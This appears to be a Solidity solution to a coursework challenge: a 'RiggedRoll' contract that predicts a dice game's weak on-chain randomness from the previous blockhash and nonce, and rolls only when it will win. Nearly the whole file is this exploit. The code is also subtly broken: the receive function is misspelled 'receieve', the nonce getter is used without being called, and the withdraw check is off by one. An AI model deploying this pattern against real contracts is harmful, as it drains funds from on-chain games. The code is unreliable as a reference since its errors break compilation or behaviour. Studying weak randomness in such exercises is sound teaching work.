pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(_amount < address(this).balance, "Amt requested exceeds balance");
        (bool sent, bytes memory data) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        uint256 passedEth = .002 ether;
        require(address(this).balance >= passedEth, "NSF, need at least 0.002 ETH");

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), diceGame.nonce));
        uint256 roll = uint256(hash) % 16;

        // winner winner chicken dinner 
        if (roll <= 2) {
            diceGame.rollTheDice{value: passedEth}();
        }
        else
        {
            return;
        }
    }

    //Add receive() function so contract can receive Eth
    function receieve() external payable { }
}
